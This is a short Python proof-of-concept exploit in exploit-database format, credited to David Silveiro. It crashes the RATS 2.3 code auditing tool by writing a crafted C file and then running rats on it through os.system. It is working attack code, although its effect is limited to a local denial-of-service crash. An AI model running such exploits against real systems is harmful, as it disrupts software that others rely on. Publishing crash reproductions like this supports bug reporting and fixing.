# Exploit Title: RATS 2.3 Array Out of Block Crash
# Date: 29th April 2016
# Exploit Author: David Silveiro
# Author Contact: twitter.com/david_silveiro
# Website: Xino.co.uk
# Software Link: https://code.google.com/archive/p/rough-auditing-tool-for-security/downloads
# Version: RATS 2.3
# Tested on: Ubuntu 14.04 LTS
# CVE : 0 day

from os import system


def crash():


    with open('crash.c', 'w') as file:
        file.write("char g [MAX_SIZE];") # Out of Block array, causes crash

    try:
        com = ('rats -w3 --xml crash.c')
        return system(com)

    except:
        print("Is RATS installed?")


def main():

    print("Author:   David Silveiro                      ")
    print("Website:  Xino.co.uk                          ")
    print("Title:    RATS 2.3 Array Out Of Block Crash \n")

    crash()


if __name__ == "__main__":
    main()
